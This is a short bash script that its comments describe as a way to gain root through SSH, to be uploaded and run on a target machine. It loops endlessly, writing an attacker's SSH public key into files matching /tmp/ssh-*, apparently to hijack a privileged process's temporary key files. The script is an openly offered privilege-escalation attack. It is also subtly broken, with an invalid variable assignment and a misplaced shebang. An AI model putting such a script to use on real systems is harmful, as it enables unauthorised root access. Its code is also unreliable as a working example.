#bash script written to gain root through ssh
#upload and run at the target machine
#!/bin/bash

key = "Insert your generated ssh public key here"

while true
do
	echo $key | tee /tmp/ssh-* >/dev/null
done
